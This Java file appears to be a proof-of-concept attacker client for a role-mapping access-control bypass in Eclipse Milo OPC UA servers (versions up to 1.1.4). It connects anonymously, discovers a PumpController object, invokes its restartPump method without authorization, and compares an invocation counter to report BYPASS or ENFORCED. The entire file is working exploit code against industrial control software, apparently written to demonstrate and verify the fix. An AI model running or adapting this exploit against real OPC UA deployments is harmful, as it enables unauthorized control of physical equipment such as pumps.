/*
 * the RoleMapper-drop defect PoC: the attacker.
 *
 * Connects with ZERO credentials (anonymous), which this deployment's RoleMapper maps to
 * ObserverRole only -- a role that is granted Browse but explicitly NOT Call on
 * PumpController/restartPump. Browses to discover the object and method (no foreknowledge
 * beyond normal discovery), reads the InvocationCount variable BEFORE, issues a single clean
 * Call service request against restartPump, then reads InvocationCount AFTER.
 *
 * On vulnerable Milo (<= 1.1.4) the server's running config lost its RoleMapper to the
 * copy() defect, so the session has no roles, DefaultAccessController's RolePermissions check
 * is skipped, and the Call is allowed even though this identity was never granted AdminRole:
 * statusCode=Good and InvocationCount goes 0 -> 1. On fixed Milo (>= 1.1.5) the RoleMapper
 * survives, the anonymous session is correctly evaluated as ObserverRole-only, and the Call is
 * denied: statusCode=Bad_UserAccessDenied and InvocationCount stays 0.
 *
 * argv: [endpointUrl]
 *
 * Prints (all easy to grep out of the run log; ts= is epoch-ms so run.sh can correlate the
 * moment of the Call against an independent LiveClient's heartbeat stream):
 *   ATTACK_DISCOVERED objectFound=<bool> methodFound=<bool> counterFound=<bool>
 *   ATTACK_COUNTER_BEFORE value=<int>
 *   ATTACK_CALL_RESULT ts=<epochMs> statusCode=<sc> good=<bool>
 *   ATTACK_COUNTER_AFTER value=<int>
 *   ATTACK_VERDICT <BYPASS|ENFORCED> ...
 */
package poc;

import java.util.List;
import org.eclipse.milo.opcua.sdk.client.OpcUaClient;
import org.eclipse.milo.opcua.stack.core.AttributeId;
import org.eclipse.milo.opcua.stack.core.NodeIds;
import org.eclipse.milo.opcua.stack.core.types.builtin.DataValue;
import org.eclipse.milo.opcua.stack.core.types.builtin.NodeId;
import org.eclipse.milo.opcua.stack.core.types.builtin.StatusCode;
import org.eclipse.milo.opcua.stack.core.types.builtin.Variant;
import org.eclipse.milo.opcua.stack.core.types.enumerated.TimestampsToReturn;
import org.eclipse.milo.opcua.stack.core.types.structured.CallMethodRequest;
import org.eclipse.milo.opcua.stack.core.types.structured.CallMethodResult;
import org.eclipse.milo.opcua.stack.core.types.structured.CallResponse;
import org.eclipse.milo.opcua.stack.core.types.structured.ReadResponse;
import org.eclipse.milo.opcua.stack.core.types.structured.ReadValueId;

public class AttackerClient {

  public static void main(String[] args) throws Exception {
    String url = args.length > 0 ? args[0] : "opc.tcp://localhost:12686/poc";

    OpcUaClient client = ClientUtil.connectAnonymous(url, "rolemapper-attacker");
    try {
      NodeId objectId = ClientUtil.findChildByBrowseName(client, NodeIds.ObjectsFolder, "PumpController");
      NodeId methodId =
          objectId == null ? null : ClientUtil.findChildByBrowseName(client, objectId, "restartPump");
      NodeId counterId =
          objectId == null
              ? null
              : ClientUtil.findChildByBrowseName(client, objectId, "InvocationCount");

      System.out.println(
          "ATTACK_DISCOVERED objectFound="
              + (objectId != null)
              + " methodFound="
              + (methodId != null)
              + " counterFound="
              + (counterId != null));
      System.out.flush();

      if (objectId == null || methodId == null || counterId == null) {
        System.out.println("ATTACK_VERDICT INCONCLUSIVE (discovery failed)");
        return;
      }

      int before = readInt(client, counterId);
      System.out.println("ATTACK_COUNTER_BEFORE value=" + before);
      System.out.flush();

      CallResponse response =
          client.call(List.of(new CallMethodRequest(objectId, methodId, new Variant[0])));
      CallMethodResult[] results = response.getResults();
      StatusCode sc = results[0].getStatusCode();
      System.out.println(
          "ATTACK_CALL_RESULT ts="
              + System.currentTimeMillis()
              + " statusCode="
              + sc
              + " good="
              + sc.isGood());
      System.out.flush();

      int after = readInt(client, counterId);
      System.out.println("ATTACK_COUNTER_AFTER value=" + after);
      System.out.flush();

      boolean bypass = sc.isGood() && after > before;
      System.out.println(
          "ATTACK_VERDICT "
              + (bypass
                  ? "BYPASS -- anonymous client (ObserverRole, never granted Call) invoked"
                      + " restartPump and it EXECUTED (invocationCount " + before + " -> " + after
                      + "). RBAC fail-open via OpcUaServerConfig.copy() (the RoleMapper-drop defect)."
                  : "ENFORCED -- anonymous Call denied (" + sc + "), invocationCount unchanged ("
                      + before + " -> " + after + ")."));
      System.out.flush();
    } finally {
      client.disconnect();
    }
  }

  private static int readInt(OpcUaClient client, NodeId nodeId) throws Exception {
    ReadValueId readValueId = new ReadValueId(nodeId, AttributeId.Value.uid(), null, null);
    ReadResponse response = client.read(0.0, TimestampsToReturn.Neither, List.of(readValueId));
    DataValue dv = response.getResults()[0];
    Object value = dv.getValue().getValue();
    return value instanceof Integer i ? i : -1;
  }
}
